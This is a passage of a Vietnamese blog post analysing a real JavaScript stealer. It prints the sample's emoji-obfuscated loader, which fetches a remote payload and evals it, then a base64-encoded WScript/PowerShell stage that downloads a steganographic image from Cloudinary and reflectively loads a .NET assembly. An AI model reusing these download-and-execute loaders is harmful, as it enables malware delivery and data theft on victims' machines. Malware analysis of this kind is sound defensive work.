<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="TMQ">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
        
        
        
            <link rel="preconnect" href="https://unpkg.com" crossorigin>
        
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2025/03/24/malware-analysis-real-case-1-stealer-with-malicious-javascript-obfuscate-technique/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
<meta property="og:type" content="article">
<meta property="og:title" content="Malware Analysis Real Case - Stealer with Malicious Javascript Obfuscate Technique">
<meta property="og:url" content="http://example.com/2025/03/24/Malware-Analysis-Real-Case-1-Stealer-with-Malicious-Javascript-Obfuscate-Technique/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/redefine-og.webp">
<meta property="article:published_time" content="2025-03-23T17:02:03.000Z">
<meta property="article:modified_time" content="2025-03-23T17:24:49.766Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Malware Analysis">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/ehc.webp" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/ehc.webp">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/ehc.webp">
    <!--- Page Info-->
    
    <title>
        
            Malware Analysis Real Case - Stealer with Malicious Javascript Obfuscate Technique | tmq&#39;s blog
        
    </title>

    <link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.8.2/source/fonts/Chillax/chillax.css">

    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        <link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.8.2/source/css/build/tailwind.css">
    

    <link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.8.2/source/fonts/GeistMono/geist-mono.css">
    <link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.8.2/source/fonts/Geist/geist.css">
    <!--- Font Part-->
    
        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/light.webp","dark":"/images/dark.webp"},"title":"tmq","subtitle":{"text":["Just a place to write Something?","When I Die I Want To Be Remembered For the LIFE I Lived not the MONEY I made."],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":50,"starting_delay":500,"backing_delay":1000,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/taquan1203","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":100},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"About":{"icon":"fa-regular fa-user","path":"/about"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"YYYY-MM-DD","excerpt_length":150,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    <link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.8.2/source/fontawesome/fontawesome.min.css">
    <link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.8.2/source/fontawesome/brands.min.css">
    <link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.8.2/source/fontawesome/solid.min.css">
    <link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.8.2/source/fontawesome/regular.min.css">
    
    
    
    
<meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                tmq&#39;s blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/about"
                                        >
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    ABOUT
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/about"
                        >
                            <span>
                                ABOUT
                            </span>
                            
                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Malware Analysis Real Case - Stealer with Malicious Javascript Obfuscate Technique</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/mitsuha.webp">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">TMQ</span>
					
					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-03-24 00:02:03</span>
        <span class="mobile">2025-03-24 00:02:03</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-03-24 00:24:49</span>
            <span class="mobile">2025-03-24 00:24:49</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/Malware-Analysis/">Malware Analysis</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<p>Đang rảnh không có gì làm, mình chợt lướt qua bài viết về một loại mã độc <code>Javascript</code> sử dụng nhiều kỹ thuật trong đó có một kỹ thuật mình rất yêu là <code>Steganography</code>. Thấy khá thú vị nên mình quyết định sẽ phân tích con mã độc này.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware1.png"
                      alt="image"
                ></p>
<h3 id="Attack-Chain"><a href="#Attack-Chain" class="headerlink" title="Attack Chain:"></a>Attack Chain:</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware2.png"
                      alt="image"
                ></p>
<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><h3 id="Phase-1-1"><a href="#Phase-1-1" class="headerlink" title="Phase 1.1:"></a>Phase 1.1:</h3><p>Đầu tiên, khi tải về sample, ta biết đây là một file zip, xem bên trong file ta thấy có được 1 file Javascript có tên là ‘Enquiry-Dubai.js’.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware3.png"
                      alt="image"
                ></p>
<p>Sau khi xem sơ bộ toàn bộ đoạn code JS này, mình nhận thấy rằng nó có nhiều hành động liên quan đến chỉnh sửa html, có thể nó đã sử dụng điều này để ẩn mã độc trong HTML, làm người dùng không nhận ra.</p>
<p>Tiếp tục phân tích source code, mình nhận thấy có một function lạ.</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params">inculcated</span>) &#123;</span><br><span class="line">    inculcated.<span class="property">averpenny</span> = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> prytaneum = <span class="string">&quot;h🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤t🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤t🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤p🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤s🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤:🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤/🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤/🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤p🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤a🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤s🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤t🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤e🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤.🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤e🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤e🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤/🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤d🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤/🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤G🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤9🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤P🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤g🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤j🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤I🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤F🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤J&quot;</span></span><br><span class="line">    prytaneum = prytaneum.<span class="title function_">replace</span>(<span class="regexp">/🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> symbolology = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;MSXML2.XMLHTTP&quot;</span>);</span><br><span class="line">        symbolology.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, prytaneum, <span class="literal">false</span>);</span><br><span class="line">        symbolology.<span class="title function_">send</span>();</span><br><span class="line">        <span class="keyword">if</span> (symbolology.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> unbelievable = symbolology.<span class="property">responseText</span>;</span><br><span class="line">            <span class="built_in">eval</span>(unbelievable);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">WScript</span>.<span class="title class_">Quit</span>();</span><br></pre></td></tr></table></figure></div>

<p>Ta có thể thấy biến <code>prytaneum</code> chứa một chuỗi là những ký tự emoji. Để ý kỹ hơn, ta nhận ra rằng có một số ký tự xen giữa các emoji này.</p>
<p>Sau đó nó sử dụng hàm <code>replace</code> để thay thế các ký tự emoji <code>🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤</code> thành empty strings.</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prytaneum = prytaneum.<span class="title function_">replace</span>(<span class="regexp">/🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤/g</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>Decode theo format trên, ta có một url chứa payload thứ hai.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware4.png"
                      alt="image"
                ></p>
<p>Để ý rằng nó khởi tạo một object là <code>ActiveXObject</code>, đây là một object cho phép JavaScript tương tác trực tiếp với các API hệ thống Windows.</p>
<p>Và ở trong đoạn code trên, nó sử dụng <code>ActiveXObject</code> gọi XMLHTTP API để tạo một http request tới <code>prytaneum</code> với method GET. Sau đó sử dụng <code>eval</code> để thực thi <code>raw content</code> của http response trả về.</p>
<h3 id="Phase-1-2"><a href="#Phase-1-2" class="headerlink" title="Phase 1.2:"></a>Phase 1.2:</h3><p>Ở payload thứ hai, ta có một đoạn javascript khác.</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Boleyn</span> = &#123;</span><br><span class="line">    <span class="attr">paramento</span>: <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>,</span><br><span class="line">    <span class="attr">decode</span>: <span class="keyword">function</span>(<span class="params">bufferless</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> decodedString = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> mutuality, ultramassive, solicitees;</span><br><span class="line">        <span class="keyword">var</span> epiploa, <span class="variable constant_">SACEUR</span>, milligrammes, droning;</span><br><span class="line">        <span class="keyword">var</span> dittander = <span class="number">0</span>;</span><br><span class="line">        bufferless = bufferless.<span class="title function_">replace</span>(<span class="regexp">/[^A-Za-z0-9+/=]/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (dittander &lt; bufferless.<span class="property">length</span>) &#123;</span><br><span class="line">            epiploa = <span class="variable language_">this</span>.<span class="property">paramento</span>.<span class="title function_">indexOf</span>(bufferless.<span class="title function_">charAt</span>(dittander++));</span><br><span class="line">            <span class="variable constant_">SACEUR</span> = <span class="variable language_">this</span>.<span class="property">paramento</span>.<span class="title function_">indexOf</span>(bufferless.<span class="title function_">charAt</span>(dittander++));</span><br><span class="line">            milligrammes = <span class="variable language_">this</span>.<span class="property">paramento</span>.<span class="title function_">indexOf</span>(bufferless.<span class="title function_">charAt</span>(dittander++));</span><br><span class="line">            droning = <span class="variable language_">this</span>.<span class="property">paramento</span>.<span class="title function_">indexOf</span>(bufferless.<span class="title function_">charAt</span>(dittander++));</span><br><span class="line">            mutuality = (epiploa &lt;&lt; <span class="number">2</span>) | (<span class="variable constant_">SACEUR</span> &gt;&gt; <span class="number">4</span>);</span><br><span class="line">            ultramassive = ((<span class="variable constant_">SACEUR</span> &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span>) | (milligrammes &gt;&gt; <span class="number">2</span>);</span><br><span class="line">            solicitees = ((milligrammes &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>) | droning;</span><br><span class="line">            decodedString += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(mutuality);</span><br><span class="line">            <span class="keyword">if</span> (milligrammes != <span class="number">64</span>) decodedString += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(ultramassive);</span><br><span class="line">            <span class="keyword">if</span> (droning != <span class="number">64</span>) decodedString += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(solicitees);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> decodedString;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> upgathering = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> spesh = <span class="string">&quot;cG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgIiRvcmlnaW5hbFRleHQgPS🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤nI3gjLjIyMi9zZWxpZi8jZW4uc2FsaWovLzpwIyNoJzskcmVzdG9yZWRUZXh0ID0gJG9yaWdpbmFsVGV4dC🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤tcmVwbGFjZS🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤nIycsICd0JzskaW1hZ2VVcmwgPS🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤naHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGF4d3VhNjN5L2ltYWdlL3VwbG9hZC92MTczODMzNDUzMy9hbGNiNGh0b2x6dmZoenp1ZnFoNS5qcGcnOyR3ZWJDbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50OyRpbWFnZUJ5dGVzID0gJHdlYkNsaWVudC5Eb3dubG9hZERhdGEoJGltYWdlVXJsKTskaW1hZ2VUZXh0ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJGltYWdlQnl0ZXMpOyRzdGFydEZsYWcgPS🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤nPDxCQVNFNjRfU1RBUlQ+Pic7JGVuZEZsYWcgPS🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤nPDxCQVNFNjRfRU5EPj4nOyRzdGFydEluZGV4ID0gJGltYWdlVGV4dC5JbmRleE9mKCRzdGFydEZsYWcpOyRlbmRJbmRleC🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤9ICRpbWFnZVRleHQuSW5kZXhPZigkZW5kRmxhZyk7JHN0YXJ0SW5kZXggLWdlID🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤gLWFuZC🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤kZW5kSW5kZXggLWd0ICRzdGFydEluZGV4OyRzdGFydEluZGV4ICs9ICRzdGFydEZsYWcuTGVuZ3RoOyRiYXNlNjRMZW5ndGggPS🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤kZW5kSW5kZXggLS🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤kc3RhcnRJbmRleDskYmFzZTY0Q29tbWFuZC🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤9ICRpbWFnZVRleHQuU3Vic3RyaW5nKCRzdGFydEluZGV4LC🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤kYmFzZTY0TGVuZ3RoKTskY29tbWFuZEJ5dGVzID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkYmFzZTY0Q29tbWFuZCk7JGxvYWRlZEFzc2VtYmx5ID0gW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZCgkY29tbWFuZEJ5dGVzKTskdHlwZS🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤9IFtDbGFzc0xpYnJhcnkxLkhvbWVdLkdldE1ldGhvZCgnbWFpbicpLkludm9rZSgkbnVsbCwgW29iamVjdFtdXSB🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤KCRyZXN0b3JlZFRleHQsJ2ZhbHNlJywnTVNCdWlsZCcsJ2ZhbHNlJykpIg==&quot;</span>;</span><br><span class="line">spesh = spesh.<span class="title function_">replace</span>(<span class="regexp">/🍑🔙🕯🔄🎪👘⛪💅🖛🏥♏🏟🎁🗯⛤/g</span>, <span class="string">&quot;A&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> unbends = <span class="title class_">Boleyn</span>.<span class="title function_">decode</span>(spesh);</span><br><span class="line">upgathering.<span class="title class_">Run</span>(unbends, <span class="number">0</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div>

<p>Phân tích qua, ta có thể thấy ở trong đoạn payload này, <code>Boleyn</code> là một object được định nghĩa để decode base64. Còn <code>spesh</code> chứa các đoạn mã base64, xen giữa là các emoji.</p>
<p>Ta tiến hành reconstruct đoạn base64 bằng cách thay thế các emoji thành ký tự <code>A</code> như trong logic của payload này.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware5.png"
                      alt="image"
                ></p>
<p>Sau khi reconstruct, tiến hành decode đoạn base64 và ta được payload thứ 3 là một đoạn powershell script.</p>
<h3 id="Phase-1-3"><a href="#Phase-1-3" class="headerlink" title="Phase 1.3:"></a>Phase 1.3:</h3><div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-Command</span> <span class="string">&quot;<span class="variable">$originalText</span> = &#x27;#x#.222/selif/#en.salij//:p##h&#x27;;<span class="variable">$restoredText</span> = <span class="variable">$originalText</span> -replace &#x27;#&#x27;, &#x27;t&#x27;;<span class="variable">$imageUrl</span> = &#x27;https://res.cloudinary.com/daxwua63y/image/upload/v1738334533/alcb4htolzvfhzzufqh5.jpg&#x27;;<span class="variable">$webClient</span> = New-Object System.Net.WebClient;<span class="variable">$imageBytes</span> = <span class="variable">$webClient</span>.DownloadData(<span class="variable">$imageUrl</span>);<span class="variable">$imageText</span> = [System.Text.Encoding]::UTF8.GetString(<span class="variable">$imageBytes</span>);<span class="variable">$startFlag</span> = &#x27;&lt;&lt;BASE64_START&gt;&gt;&#x27;;<span class="variable">$endFlag</span> = &#x27;&lt;&lt;BASE64_END&gt;&gt;&#x27;;<span class="variable">$startIndex</span> = <span class="variable">$imageText</span>.IndexOf(<span class="variable">$startFlag</span>);<span class="variable">$endIndex</span> = <span class="variable">$imageText</span>.IndexOf(<span class="variable">$endFlag</span>);<span class="variable">$startIndex</span> -ge 0 -and <span class="variable">$endIndex</span> -gt <span class="variable">$startIndex</span>;<span class="variable">$startIndex</span> += <span class="variable">$startFlag</span>.Length;<span class="variable">$base64Length</span> = <span class="variable">$endIndex</span> - <span class="variable">$startIndex</span>;<span class="variable">$base64Command</span> = <span class="variable">$imageText</span>.Substring(<span class="variable">$startIndex</span>, <span class="variable">$base64Length</span>);<span class="variable">$commandBytes</span> = [System.Convert]::FromBase64String(<span class="variable">$base64Command</span>);<span class="variable">$loadedAssembly</span> = [System.Reflection.Assembly]::Load(<span class="variable">$commandBytes</span>);<span class="variable">$type</span> = [ClassLibrary1.Home].GetMethod(&#x27;main&#x27;).Invoke(<span class="variable">$null</span>, [object[]] @(<span class="variable">$restoredText</span>,&#x27;false&#x27;,&#x27;MSBuild&#x27;,&#x27;false&#x27;))&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>Quan sát đoạn base64, ta thấy rằng nó đang thực hiện nhiều hành động bất thường.</p>
<p>Nó khởi tạo một biến là <code>$originalText</code> chứa một chuỗi là các ký tự bị đảo ngược.</p>
